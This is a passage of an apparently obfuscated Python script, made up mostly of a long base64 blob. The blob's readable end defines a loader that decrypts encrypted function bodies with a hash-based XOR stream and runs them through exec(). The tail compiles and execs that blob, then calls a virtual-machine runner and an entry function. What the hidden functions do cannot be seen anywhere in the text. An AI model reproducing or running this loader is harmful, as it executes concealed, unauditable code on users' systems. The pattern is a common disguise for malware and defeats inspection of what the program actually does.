ZYV0JnUFFkcllxZ2RyaDNEMzFadjJLcGNOMmFYZjh5akhqN2JzYm5ucUZjMUpmQ2MxUHpVenh2YlR3clhQQ2RsbkhPbE9QbGFRK0ZsWEdwa2NPWVpPZEtZS0QzODN2Mm1NakNzUjI5YWdtZXNZeU9Db3dpQUEzejRqRjZlUXhHaERXTm1LM0NQRUtEdVJ1SVR5K2JOT0xBWW1EclJzeTgrZWxmeGp5cTQrdnZ2K0JNVm9JVG9JSGlEYThuSFFMczMzNDFsS1loOGJFMUNldXJjdlF5dWNCY2NoalowaVJZdkg1UVhUVTJtWGpTNlk5ZmNjVlBPYW05aElJVFRCSFJ1OHh1Y2ZuajVwNnNuajB1Y0JTOG50UGx1b0xuVlZTZmg4cEpkU2txZlpwblBnbnJabGhMNHpsbWpDMEFGbnFjZndwUmpFd0tnWUc2bFZEZWE3WFNZMnVBcXNTdWV4ckJnK3Q4TnZPdkRLZjg3YldCRE5JcEZqY2R2SVlYWW5LMWRTekoxb040T2FLNFN1UkVMRE5tSTh5cDVISnRhaFY5OHZQZmxJeXE2MGZLbmVvQkRzYTlxMmRhMFkwVStUZ2J0emRFVGtEVUE4N1lSOFRPL09Mc3plalMvbEtFb285b2hsVWVQWXRrRVBGSkJRRGV5SGZTSE1rZzJNaFZGQ253WXJYenFVd1RlTU5iZWlEODhUZGFmVGUrTTVSRGo2UFRyL3BOdmlNMEZQODJ4WVNpSWdSSjNCaDNqRmFPSTlOdXBhR2t2OUZzUDdDcEpsTDh5U2p4bUgyUHRJc045SVdwcmEyRnZHcUlkS012M25uakVkNnFtT2lNOG14cm1BalZXUi9CUGIrcXhFNDE2L2VkTFovazk4dzRGVGxqQ1ZYWEs2T2lwUG9Ud3hMTUFzbzR4RXhrNXo5YlJEUlpMQ0grZGo2QmlWWVQwSkhka0lOSlZaSzNQYUlXQXZKRHUxQmNlS05FVEhwQUc2TDFqbkNVMXQ5dWxMRWJyeGdHb0NmOHJCYTY4RDRLbzZqRlNVNWFObStOS2RBVUdyQVlWZ2JsVFBzbWlMbDAyemo4SFdGdjNDRmM5ZnYxWHl2WTF5TUNYU004bWNTYVc3YWZ5YkN1Q0FUYVpiTGY1SzNZWWhGem5NbzFjMnFlUCt6SVB3VHdKR1l1Y1BVSG5kbVFTQ0JEL3IxRmpwZFdDVjZFSHVkRHRrK2NieWdjbFVnQlJ5NVkycHR3Q2JSUzMrSmpLbi9GZUlaaWczRDJkaGVYMUhWTnhTakk5cTBMOThPU0dxZk83WTlpQkwydk1uWVVaYS9CUWh2UWFYK0JoY2twQ0k2dWlxQWdxbTB2eHA1ZjI1QlIvbHVWeWNOaHR6V0dKbjNPdHRGNGgxUHljcGRoUXA5bWFLT0d4MUkyVkFhTUlLb3FzWVkxOTZBNWVHcTEzcnFBMytWSlk1UVpZbHVSZVpRKzhYOTNiMDJWdDNvd1FGblZFejh0NmdiUjF1VnhtNDJuQjJRMTNycGlSbkJ6T2NINUR6OTgvSlRYMGFaejNGclpWbXltSFZHQk90eXY2dGdKSDhXcVQzeEdXMXg5Y1FIMUVpQ3FWcXVJWXNBODd1b2FHd1NaR2VvRS9vS1dSNTNuaGw0SWRwMkdtSjlCV0ZwZytpWFVicHVNeXcxOTM3VFY0Z1JsN0F1aTV4Mzh5aTZTVmRSSVlVOUtzTlRhZkdaTUFSY2JFYllaR2ZTM3JPWWQ0N0JqQ0JYdjJkbnNpdTRGejFkeldhSCt6T3kzdlNjVzV0M1l6Nk5aUURkTXVZT3JMNXNmS3FTY0NUYzZ4UzA4ampaOHJYQTlLMHZPdnRjV1hBcnBwYWtFK1VMc0w3K1hkS0pGZzdsYnlic2RaL01CbTRjMVZXN25FejdVd0pSc1hHY0pHYVI4TGFWYmQ4Vkg3cStkeThJOTJGekw3MjE1dnQzSHZpMjNKQmV3aGVjMElPQkVEVmo4VmRpVVN3WC94RllKcXhycTNnTFNDRVdLbStNZDd0SVBHcFdqNSt3bjVBM0JjNGZNa3ZzcWRlUHZoZmY2Ym4xZU5wL1h5RDhBOEdBUThHZThWNHZkVkM3ZFlGNDQ5dnFYVjluZHUwSE95UFUwOFV0aFFhQVZkM3pKbVhjUDYyc2hGZmpPMGZZMmhEUmdmeFBaYi9ZRnY1d3dUMDFOY0tEZmJ6UWJORkQwZ0R2MkdneWhRUk1BUlM1WFJzUzZCbjVMeEJ1VWxwekFSNlVaeW11U1cwUlhWNTg5QldTb0NVQ1FBQzVSSTJUbENUUm9XcnoydldYZDlVMnU3Z3JWcmdzTDJXMHpxaGFlVXVXVHpoT1FBbWVZdUJHWHB1RExDeWR4bmNNQnFZS0kvVmJkV3ZpODY0MVNUTXBuR0NrV0hnSVdsNStkWmZqVElRL1luMG5uVDhwRTJBbEpSQmF4RVpmdVkzWWpvNzEwMVdLaW9ENU16RGJPQjNhaFlYOVBvRnlQa0pVY1h1am9oWDJUSGNTOUYrcFVBT3ByNWFkUitwV0dEeDFZK2dLVkVrSHRGSnZoRHY2YWdvblRMaDNxc2xmR2RvN3U2NDZ2Tk1XaVZaOHl2Y0pWUlkvNUxKSk8zR1psYzFkZ1NoVU00WUVFaDRtd1pkc0pJdnV5U08yY0pKL0pMcGxDekxKemxtV0s4RTdkdkJiRlc2MFNOVkQvbXBaVzZ6dDk3VkNKcWtTQUdYUUxlTlN3RVFnUjRqZno4b25NdG1tSzA0NkRSTDBRY1hQWmJ4azJEcmJDRmpMdU9seGVEeEY3U3VlS2N6MldYVVBCYnRMbXpId0dBUkh5emFVdTZQcGcraTIwQVF6QVl0dmRBREZsM2FDa0VUaWZjYzRiQ05vYnEvVUhRQkhVcm1TWjVDYVBqMFBiS204V2t4Y0xHZXV5dlVjZ0JNSUc0NHQ0RWR4NUhSOFRiUjQ4STk5RjBvUXZ6UkNja1BNQ2FqeHEvRngvM3NJL1dWeHdCOHEyUXRqVHBqVUQyQ0hRbHlDMFdEL3JyemVOYm5EclpDRUpacVNjZndWQ0RGNzdNbUFaNTFxSDU2Z3gyK1B1NU83ZFR6azR0VS9xcTNoSnB1RzB2RmNFU2hxRVhBTkxUN1g4MEk3Ylhsc0h5VTJZYnc1bkdBMzZGazkxRmtFdm5BK1kvbHk3K2lXdEczWTRWekxCRngvWDczd09ESTV1Z1JKYXhDaDlhWWw5VXNPd0ZycFlWV21WRW13aVl5eWdzbVEzajltSXlJbEoyVjFzQXB4WkhCNkdQeGVHUkVPQ2REWVRUcUgxMnJaRGZOVzV6RCt1bmlESUNCQjJzckVsQitlYk80QStuMUpFakdXUkpIem5kTkxBTVhWSHlLa3hmRzBFNncwSHpvbVZOZFdCempsOFdRNndNSXAwd2UvL0tXVXByUVk1KzhEY1FQSlgrdXhSY2dqTXI2TXhNUGs1akZqeXFUS3J4cVJVbVpTYW15emxCUVpuY1pqOW1lNldKTFlFM2F5T2FmRVE3ekVwTHBiNTgrRWN0RjBXS3lNRGFoSkJDTTlaL3d6UExPaGJQb1JyWnlIQURwNC9xNC9pZGNPZ3JvbkhublRhT1FpendmZUR5RkZQMTRIMmpXTUs4UjJvSGVEV1JvMlpubEYwNzN4Um1qMUdEbkQraFQrZUoySGNhOXA1N3hkdWd2M0JCRFlRTEdlWk1yS2dtWDgyU1BqaWRqUnNFUWl6QnN5VnFIMmVOZjRrTHgzMVpNUjZrdXoxVk5qM293UXZ4dHIzaDdYTHpmcmlla0c4WGlCeU54OHcvbUQ1dWVUd3hWQzBQMTl4ZHJPWmFiRmRpWk5Kb1ArRWYwUzdWMm9FanVwWi9tWXJYUUdXaG0ybDNvN2xrYTRHODRxUmlQdTVMakE4U09RdGY1S0EzOUZBMnJhSzA3V2xrODlOQVRlNkdIL1NSWG1nY1dVelZKQS9WSXRTUlRuRVdyd0VsaVRDS2hQMHlaaUFqMTc4cHVwSkNpMmNMQ0VHU1UvMXgxcWs0RWdGdlNpdE8zQngyV1B2bGdrVnZqSDQwSUU4ekVFdlpGZVBpaHA3WHVvaEZCU3FxZlJ3WFBzdkFBcWtyTUZlSHZkTGxXM1N2MnV1M05kMjVkOGNJS055U1l1M3l5Vjk4Nk43SVI4S2ZhTkJoeW1PWEorQkpHdWMwS2RiUTlucm5lMDRlWUVKUnYwL3Y3OHRERDQ1c2h6cUNZVXpLQ01QSldUNVBuMGRiMXVSc25LcWJHTTJTRkM4dlJTU01SZHZKa2FzSldqTEtSSHE1YUlld3NEcktXUlZhYmk5cTRteEpEU2ZWRysvcTdVc24vQlJuc1BZNUplTUhlMmt1SWR2REdSeHQ1REkrV3FSNllSUGNJUXZMQS84ZXFCVVhWV05hMmtkWWNvYy96QkNkSEthVFVnVzRVRGxmc2l0clcvV1lQQWpXcUtGVHl6V3hiZVlSTnlYdWJuUmR2UXl4MXBQSVl3cjI5UzBycUo0cjE5RUIrTFhVejhPN2tPcURmTi9TbmFtSDYwRDR4R0F3ZzYyTnllRDZGWkRxUkk3a3RUOFAxMXVTRi9qOHVvaFQyc0JBWGRoanRTTGNEQmV2amdPVEE0bTlvTmV5dDNTRzlZUkJKTlNYTkVCTHVSWXlBWEYvaXM5RTVlbkNsSkNTN1VLYWp6STdTWGd0OUNxTTJ4dVBETUdlZGNCT0tqa01lQ0N1MWNvY1NldXR0VmVRWTkvdFA4SDZYVEUyRjNRUkY5cGJIMjZCZk13alBUZkZlK2x6aTA3N3ZHNCtZWXJTU0ROMmJabzNyaURudjlMWmVPOExORDhxY1FBY0tnb0VPUHlDdGp3R1lZM3YzNE9IaVNOVEE3VkYwYlNwUGR5MEJwYWJFREFmVFYvNEFyZko1dkV1UWpTL1pjcHNSVlNkT0xUNDVJSkQzSWZ3T2lGRSs1VnVSRlFjbHN0T2thbk43b0I1Q1VSbFlhZTllWVpiK3QvM1IzZ2tFSnBPaHYxdFh5OFFNT25nNFNZMHJIZEdhRHJxUzlHdk4yejFhNFZ2K2YydWtQRW0vYVpkZWFJbGg1T0NhRkNFaUVlRHhzSkcrNzcyWnlSQm0rVkZwTG1ObVA1Q3hCMVZzY3BWbG1lZXR2MmpCd2M5L1JvR1ViUmZBSWFCcXBpby9ZanlhazZXWmtYclRLU09qWkpZTGcyc1NVQlcrMnpZUUl4ZTZ6a0dield6dkRXSTNkWnNndDhVMnVELzB3RjViVGUzUVNZbHd2N3gzNU9KbEFkQ2t1cVJOb3gwUFFEOGN0TEZZeERkLzRuandmVFlrTjdvV1kxd0k0b2FBKzdnNXZGV3pQZGtTSlVnWlZyV0ZFb0RmWmF2VC93dHNXVU15aGdyeWl2ODZUcVpVSUhlYXk1NDgyMlhwK3dMK0RMbVdtMFoxcVZ2WS9VZTFWUDVlZmJWQ0o0UG5EdUlGaTVwM0ZTR2xHdU90NVByNUlna0FxLzBJREJKZ0EzTjNXU0RkcHp6Zjd6WFZwdlhVVGMycmY1bGdaSG5zN1BabkFNZzBKR0hEMXIvVWdDTUQ1UFlPYUsvR0Q2UFU5MWFib1o3bE5zVUh6Qmp4L2lWZEpDams2RzliRVdTUGxoODZLT0REU0RRbmRsbTZDdzVTUXorMmlnWTQxZ1BXdElmWHFlY0dSbGx2Y2ZQZTEzdFE4QjdqN3Y5TVB0Vjg4eWQ4aGYrSE9aS05yRm9PL2wyakZoQ2hyQTRlaGNod09mTHorUE5zKzd3c0NGc21lbW9jOUxYWDBsVXNaTWtocktTcGJuWjBEbDVTRW5pQ09McFlTUEU1dlZsOUpiUVB2cktwUkZ1R1ArMFZZbnN1SitvMVdlVG02QlVxcldSK1N2dnlab0tIYXd5Nk4wOEF4Z0Y5ZWRycjZDWnhrZWFvWnRjTHVKdmVyNjNWdzE1NEdqcTArK0R2OHBkVDRndmVBeEVWOTZ1ZElBMHNnUXJvK3VoeFBFZXhEWENsZWFDNW1zbzVuZjhVVlQybjFLc0UwNWFhZExBZCtvZG9hSWk3RTh6S1B2SkcrUGcrYXdaMU9zcFNxU2pMcGdjQWhuWUhQdVB3TGdWUnBmWVhlV3ZhazRrcWppSUZIaE4vM3h6bUNoQS9HamxSVlVKVHNOc3IwdUVXRXh3M3Z2dzdmUEhwaTNxQVg1V2tKMUI2VWZINzE1b2FaUmR3QkJEVWxodGNjekkwa1N0Rk9wOVFNT2g4TDMzUDc0ZDN1R3lMNXI2ZkpJT3FISVhpTnNubFBCNitOUE5iZmw1VnBIb3ZoVHZyR2hLWmQyNFhvdmp4aUZvanBIazdJMlBLMHgzYjBaVzVuYVFSY2l1SDlSd1NiNDkrbndPQnZERUYyRURtRmJjeTVjL2VEazAvdW5wUzdwRkRhWHNvUXl2VWVzQ1ZUelNhZ2xYd1RzRHRTNWFONnFkUkRYQWJFVFBlY3ROdklEUG44andwa3ZTOGw4c0ZCRnlpOGRRMk9jZzlMbk5KYWtVaXdNUENyaDQ0WGo3RW5OWVpsM1BIT1JZQS84MEJ5QmRvNEUwSXd2NGI5M2RpUml2N1F0QlNxNkJFZ1JhNnYvMVMzSEE3emZkM3BORGZiYVYvWEIwNlRIMHlkTkpXb29qOXE5SFVsTUdYaFdoMUxjQjVXYUdBL0xPOXFHMlUrVlBERGZoeGptYlpTY0pKbmlwcXJPczlTcDE0S0lmL09GRHJJaWtVZ3hKWSs2UXF2b1J1Rzl2YmZDamd3M08xNk55SGw1SXpYaVZtUGRMNHJrR1czL2E2TjNybFk4a20yZkI2T0Z1SGxXS1dGY2NsN3Q4M0FvWUx3LzI0Uis5Qk1WVWF4dGRXWWlvSWUrajd4WStZaDZpZVhCaU1NV0lTVExZWU1OMy9ReXlRdjZJV0dHWlUrQWhZWWZNZ2ZTQlI2WkxtRjVhWlcwRTFkckJRaTVIcWFmUkVvZXVpUjJVdmNrUm9PajhxeTB3bTI4VGZNdHVJc0k5RUZpME1NZ3NWblpJbEg5ajFpNjlVZjhuWnE4NXZ4c1U1U3dKenZ4Y3Q3Rkdkdkl6MXgzMUU2bGlVQ1JaSmh1Mm9xZ3M3YTVJUVhyazR2Vk16MGYrei8ybTVLN0pCTjdMRDMvY2hnM2Z3ZHgrK1VmQjlHSGxDZHB6M1BSV2hLRnVkKzArck9aTkY0K0VVcjluaFowcm1CV0h6d3E4N1J2aXVEcmtEc04ydVgzMW9sWUNKUWNhMWxuWUt1UVBEbkpuVzVRS1BwZGtERG5qbnJkbVFWaC8rWVEzS3J3WnhUR1RoSG5nTUJyRi8xazAvSDEyZnNxb1NxSzlhaEczVGszTU0wL09OdDU2QkFiaXB4dHh0cEVFV2hvcFR1Rm52YzVjOTJZN09ZS0NReG1iZjM5REI0NXVFaTRSeUpuaEQ0NXkvUCtQSmd3Zm80alhyRUJMWEw0L3JsR2kvS2FmeDhycGs0QXl5SDlHSURBZTNNVHF5MjFLS2hzMG9DZDE4YXBJMjJOeU5UWEJraXZaRUJlT1lYcTdtTVNyVGxtcWRXOUJHSFFjaUZ6aDNSS1U1M0dXQU9Bdjd6Z3VxQXY0UGp5alo0bGZTSHVhUFBMeS9kK0Y1NUozbitaZTBZd2RRa0doNmRCb1hwNms4Qk5xT1JJdFlRRVZzcUVtaytza0VCNVE3OW9Jbk93NnZNUDVoOEdUWEc1WUplS0dHSmdHUlZ6ZzU1a2lvSzhBVkVzZXJUbUtjRUY5aTV2QWFoMVc0ZENzeHFFUERSc3dhbFduYWNoWkhXejBLU3Q4eTkyM2RDVTBCU0FJVnJkSWdkUVJKVElpQXM1Ukh1ZmNDSEVWZ1FHRGg1VzNQTHhYamJrZFp2ZHNHWk9panZsczNYc1pmdFZNelBQV2c0K3hBakdXQnZZajVoNGNKYXpxYU1XUFFFMWs1cUg1R2laQUI4M0hvU3RqcURhSHRwbUMzcHUrVngzcUxPV2NDVlNtV0srVkNiWS9kWk9hRWUweGdaZ0h5MlZWWHRoaTB4My9LYmQ5YzIvSXBSL1lnTGxMN20rbHNmdzByVWg2RWd5ellITW1VdngrZFcnKV0KX0ZVTkNfQ0FDSEUgPSB7fQoKZGVmIF9leGVjX2VuYyhpZHgsIGtleSwgbmFtZSwgYXJncywga3dhcmdzKToKICAgIGlmIG5hbWUgaW4gX0ZVTkNfQ0FDSEU6CiAgICAgICAgcmV0dXJuIF9GVU5DX0NBQ0hFW25hbWVdKCphcmdzLCAqKmt3YXJncykKICAgIHJhdyA9IF9GRU5DX0RBVEFbaWR4XQogICAgbm9uY2UsIHRhZyA9IChyYXdbOjE2XSwgcmF3Wy0xNjpdKQogICAgY3QgPSByYXdbMTY6LTE2XQogICAgYXV0aF9rZXkgPSBoYXNobGliLnNoYTI1NihiJ2F1dGh2MTonICsga2V5ICsgbm9uY2UpLmRpZ2VzdCgpCiAgICBpZiBub3QgaG1hYy5jb21wYXJlX2RpZ2VzdChoYXNobGliLnNoYTI1NihhdXRoX2tleSArIGN0KS5kaWdlc3QoKVs6MTZdLCB0YWcpOgogICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcignW2Z1bmNlbmNdIGludGVncml0eSBjaGVjayBmYWlsZWQnKQogICAgZW5jX2tleSA9IGhhc2hsaWIuc2hhMjU2KGInZW5jdjE6JyArIGtleSArIG5vbmNlKS5kaWdlc3QoKQogICAgcGxhaW5fYnl0ZXMgPSBfeG9yX3N0cmVhbShlbmNfa2V5LCBjdCkKICAgIHBsYWluX3N0ciA9IHBsYWluX2J5dGVzLmRlY29kZSgndXRmLTgnKQogICAgbnMgPSB7fQogICAgZXhlYyhwbGFpbl9zdHIsIGdsb2JhbHMoKSwgbnMpCiAgICBmdW5jID0gbnNbJ19mJ10KICAgIF9GVU5DX0NBQ0hFW25hbWVdID0gZnVuYwogICAgcmVzdWx0ID0gZnVuYygqYXJncywgKiprd2FyZ3MpCiAgICByZXR1cm4gcmVzdWx0Cgphc3luYyBkZWYgX2V4ZWNfZW5jX2FzeW5jKGlkeCwga2V5LCBuYW1lLCBhcmdzLCBrd2FyZ3MpOgogICAgaWYgbmFtZSBpbiBfRlVOQ19DQUNIRToKICAgICAgICByZXR1cm4gYXdhaXQgX0ZVTkNfQ0FDSEVbbmFtZV0oKmFyZ3MsICoqa3dhcmdzKQogICAgcmF3ID0gX0ZFTkNfREFUQVtpZHhdCiAgICBub25jZSwgdGFnID0gKHJhd1s6MTZdLCByYXdbLTE2Ol0pCiAgICBjdCA9IHJhd1sxNjotMTZdCiAgICBhdXRoX2tleSA9IGhhc2hsaWIuc2hhMjU2KGInYXV0aHYxOicgKyBrZXkgKyBub25jZSkuZGlnZXN0KCkKICAgIGlmIG5vdCBobWFjLmNvbXBhcmVfZGlnZXN0KGhhc2hsaWIuc2hhMjU2KGF1dGhfa2V5ICsgY3QpLmRpZ2VzdCgpWzoxNl0sIHRhZyk6CiAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCdbZnVuY2VuY10gaW50ZWdyaXR5IGNoZWNrIGZhaWxlZCcpCiAgICBlbmNfa2V5ID0gaGFzaGxpYi5zaGEyNTYoYidlbmN2MTonICsga2V5ICsgbm9uY2UpLmRpZ2VzdCgpCiAgICBwbGFpbl9ieXRlcyA9IF94b3Jfc3RyZWFtKGVuY19rZXksIGN0KQogICAgcGxhaW5fc3RyID0gcGxhaW5fYnl0ZXMuZGVjb2RlKCd1dGYtOCcpCiAgICBucyA9IHt9CiAgICBleGVjKHBsYWluX3N0ciwgZ2xvYmFscygpLCBucykKICAgIGZ1bmMgPSBuc1snX2YnXQogICAgX0ZVTkNfQ0FDSEVbbmFtZV0gPSBmdW5jCiAgICByZXN1bHQgPSBhd2FpdCBmdW5jKCphcmdzLCAqKmt3YXJncykKICAgIHJldHVybiByZXN1bHQKCmRlZiBfeG9yX3N0cmVhbShrZXksIGRhdGEpOgogICAgcmVzdWx0ID0gYnl0ZWFycmF5KCkKICAgIGNvdW50ZXIgPSAwCiAgICB3aGlsZSBsZW4ocmVzdWx0KSA8IGxlbihkYXRhKToKICAgICAgICBrcyA9IGhhc2hsaWIuc2hhMjU2KGtleSArIGNvdW50ZXIudG9fYnl0ZXMoOCwgJ2JpZycpKS5kaWdlc3QoKQogICAgICAgIGNodW5rID0gZGF0YVtsZW4ocmVzdWx0KTpsZW4ocmVzdWx0KSArIDMyXQogICAgICAgIGZvciBhLCBiIGluIHppcChjaHVuaywga3MpOgogICAgICAgICAgICByZXN1bHQuYXBwZW5kKGEgXiBiKQogICAgICAgIGNvdW50ZXIgKz0gMQogICAgcmV0dXJuIGJ5dGVzKHJlc3VsdCkKCmRlZiBfYigqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygwLCBfRlVOQ19LRVksICdfYicsIGFyZ3MsIGt3YXJncykKCmRlZiBfZSgqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygxLCBfRlVOQ19LRVksICdfZScsIGFyZ3MsIGt3YXJncykKCmRlZiBfZigqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygyLCBfRlVOQ19LRVksICdfZicsIGFyZ3MsIGt3YXJncykKCmRlZiBfZygqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygzLCBfRlVOQ19LRVksICdfZycsIGFyZ3MsIGt3YXJncyk="), '<exec>', 'exec'), globals())
    _vm_run(_c, _k, _m, globals(), locals(), _map, _ok, _ht, _pf)
if __name__ == '__main__':
    _njwhj()
